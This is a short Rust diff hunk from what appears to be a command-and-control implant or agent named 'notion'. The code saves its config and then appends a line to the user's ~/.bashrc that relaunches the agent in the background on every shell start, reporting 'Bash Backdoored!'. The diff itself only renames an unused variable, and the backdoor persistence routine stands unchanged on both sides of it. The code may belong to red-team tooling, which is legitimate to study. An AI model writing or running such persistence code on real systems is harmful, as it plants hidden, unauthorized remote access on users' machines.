@@ -137,7 +137,7 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<St
                     // Save config for relaunch
                     save::handle(&format!("{app_dir}/cfg.json"), config_options).await?;
                     // Write a line to the user's bashrc that starts the agent.
-                    if let Ok(s) = shell::handle(&format!("echo '{app_dir}/notion & disown' >> ~/.bashrc ")).await {
+                    if let Ok(_) = shell::handle(&format!("echo '{app_dir}/notion & disown' >> ~/.bashrc ")).await {
                         Ok("Bash Backdoored!".to_string())
                     } else {
                         Ok("Could not modify bashrc".to_string())
